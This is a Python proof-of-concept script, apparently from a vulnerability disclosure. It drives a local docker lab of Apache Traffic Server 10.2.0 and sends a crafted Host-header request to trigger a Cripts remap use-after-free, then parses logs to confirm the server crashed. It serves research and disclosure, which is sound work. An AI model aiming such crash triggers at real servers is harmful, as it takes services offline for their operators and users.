#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: ats-cripts-rri-uaf (High: 7.5)
#  Vendor: Apache Traffic Server (ASF)
#  Versions: Apache Traffic Server 10.2.0 (b1df7334)
#  Impact: Cripts From/To URL UAF crashes traffic_server after DoRemap
#  Requires: Cripts remap with From/To URL after DoRemap
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "ats-cripts-rri-uaf"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove ATS 10.2.0 Cripts Remap From/To URL UAF after TSRemapDoRemap."""

import os
import re
import socket
import subprocess
import time
from dataclasses import dataclass
from http.client import HTTPConnection
from pathlib import Path

LABEL = "ats-cripts-rri-uaf"
WITNESS = "ATS-CRIPTS-RRI-UAF-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
HOST = "127.0.0.1"
PORT = 18780
TIMEOUT_S = 12.0
SERVICE = "ats"

CRASH_RE = re.compile(
    r"stack-use-after-return|heap-use-after-free|AddressSanitizer|"
    r"DEADLYSIGNAL|SIGSEGV|SIGABRT|segmentation fault|"
    r"received signal 6|Aborted|sdk_sanity_check_mbuffer|"
    r"rriValid|Remap::From|mapFromUrl|_do_send_response",
    re.IGNORECASE,
)
RRI_RE = re.compile(
    r"rriValid|Remap::From|Remap::To|mapFromUrl|mapToUrl|"
    r"Urls\.cc|Context::reset|TSRemapDoRemap|_do_send_response|"
    r"sdk_sanity_check_mbuffer|GetSV",
    re.IGNORECASE,
)


@dataclass(frozen=True)
class HttpHit:
    status: int | None
    headers: dict[str, str]
    body: bytes
    error: str
    reset: bool
    timeout: bool


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 500) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def ats_running() -> bool:
    proc = compose("ps", "-q", SERVICE, timeout=30)
    cid = proc.stdout.strip().split()[0] if proc.stdout.strip() else ""
    if not cid:
        return False
    inspect = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", cid],
        text=True,
        capture_output=True,
        timeout=20,
    )
    return inspect.stdout.strip() == "true"


def ats_state() -> str:
    proc = compose("ps", "-a", "--format", "json", SERVICE, timeout=30)
    blob = (proc.stdout or "") + "\n" + (proc.stderr or "")
    inspect = subprocess.run(
        [
            "docker",
            "compose",
            "-p",
            COMPOSE_PROJECT,
            "exec",
            "-T",
            SERVICE,
            "true",
        ],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=20,
    )
    if inspect.returncode == 0:
        return "running"
    inspect2 = subprocess.run(
        [
            "docker",
            "inspect",
            "--format",
            "{{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}}",
            f"{COMPOSE_PROJECT}-{SERVICE}-1",
        ],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=20,
    )
    if inspect2.returncode == 0:
        return inspect2.stdout.strip()
    return clip(blob, 200) or "unknown"


def ats_logs(tail: int = 250) -> str:
    proc = compose("logs", "--no-color", "--tail", str(tail), SERVICE, timeout=45)
    return (proc.stdout or "") + (proc.stderr or "")


def http_get(host_header: str, path: str = "/") -> HttpHit:
    headers: dict[str, str] = {}
    try:
        conn = HTTPConnection(HOST, PORT, timeout=TIMEOUT_S)
        conn.request("GET", path, headers={"Host": host_header, "Connection": "close"})
        resp = conn.getresponse()
        body = resp.read(4096)
        headers = {key.lower(): value for key, value in resp.getheaders()}
        conn.close()
        return HttpHit(resp.status, headers, body, "", False, False)
    except ConnectionResetError as exc:
        return HttpHit(None, headers, b"", str(exc), True, False)
    except (TimeoutError, socket.timeout) as exc:
        return HttpHit(None, headers, b"", str(exc), False, True)
    except OSError as exc:
        err = str(exc)
        reset = "reset" in err.lower() or getattr(exc, "errno", None) in {54, 104}
        return HttpHit(None, headers, b"", err, reset, False)


def wait_health(attempts: int = 60) -> HttpHit | None:
    last: HttpHit | None = None
    for i in range(1, attempts + 1):
        if not ats_running():
            log(f"health-wait ats-not-running attempt={i}")
            time.sleep(2)
            continue
        last = http_get("ats-health")
        log(f"health-wait attempt={i} status={last.status} err={clip(last.error, 80)}")
        if last.status == 200:
            return last
        time.sleep(2)
    return last


def crash_from_logs(blob: str) -> str:
    if CRASH_RE.search(blob):
        if re.search(r"stack-use-after-return", blob, re.IGNORECASE):
            return "asan-stack-uaf"
        if re.search(r"AddressSanitizer", blob, re.IGNORECASE):
            return "asan"
        if re.search(r"SIGSEGV|segmentation fault", blob, re.IGNORECASE):
            return "sigsegv"
        if re.search(r"SIGABRT|received signal 6|Aborted", blob, re.IGNORECASE):
            return "sigabrt"
        return "crash-log"
    return ""


def main() -> int:
    log(f"label={LABEL} pin=10.2.0 b1df7334 host={HOST}:{PORT}")
    log("class=Crash reach=Remote sink=Remap::From/To URL after TSRemapDoRemap")

    health = wait_health()
    if health is None or health.status != 200:
        logs = ats_logs()
        log(f"ioc health-logs={clip(logs, 800)}")
        return fail("health-not-200")
    log("health-http=200")

    if not ats_running():
        return fail("ats-dead-before-control")

    control = http_get("ats-control")
    log(
        "control-http={} x-lab-control={} x-lab-host={} err={}".format(
            control.status,
            control.headers.get("x-lab-control", ""),
            control.headers.get("x-lab-host", ""),
            clip(control.error, 80),
        )
    )
    if control.status != 200:
        log(f"ioc control-logs={clip(ats_logs(), 800)}")
        return fail(f"control-http={control.status}")
    if control.headers.get("x-lab-control") != "ok":
        return fail("control-missing-header")
    if not ats_running():
        return fail("ats-dead-after-control")
    log("control-alive=yes")

    pre_logs = ats_logs(tail=80)
    log(f"ioc pre-poc-running=yes pre-log={clip(pre_logs, 200)}")

    poc = http_get("ats-poc")
    log(
        "poc-http={} reset={} timeout={} err={} x-lab-from={}".format(
            poc.status,
            poc.reset,
            poc.timeout,
            clip(poc.error, 120),
            poc.headers.get("x-lab-from", ""),
        )
    )

    time.sleep(1)
    logs = ats_logs(tail=400)
    crash_kind = crash_from_logs(logs)
    running = ats_running()
    state = ats_state()
    log(f"ioc ats-running={running} ats-state={state} crash-kind={crash_kind or 'none'}")
    log(f"ioc poc-logs={clip(logs[-1500:] if len(logs) > 1500 else logs, 1500)}")

    if "exit=134" in state:
        crash_kind = crash_kind or "sigabrt"
    elif "exit=139" in state:
        crash_kind = crash_kind or "sigsegv"

    crashed = (not running) or poc.reset or bool(crash_kind)
    if poc.status == 200 and running and not crash_kind:
        return fail("poc-served-200-no-crash")
    if not crashed:
        return fail(f"poc-no-crash http={poc.status} state={state}")

    if crash_kind and not RRI_RE.search(logs) and crash_kind.startswith("asan"):
        log("ioc asan-without-named-frame (stack UAF still counts)")

    log(
        "privilege=availability GET Host:ats-poc through remap cript "
        "do_send_response Remap::From/To::URL::Get after TSRemapDoRemap; "
        "traffic_server crash. Adjacent closed: File::Path::Rebase jail, "
        "Geo IPEndpoint, query-key abort, global cripts rri==nullptr, "
        "Client::URL post-remap CONTROL 200."
    )
    log(
        f"SUCCESS {LABEL} control-http=200 control-alive=yes "
        f"poc-crash={crash_kind or 'container-death'} "
        f"poc-http={poc.status} reset={int(poc.reset)} {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

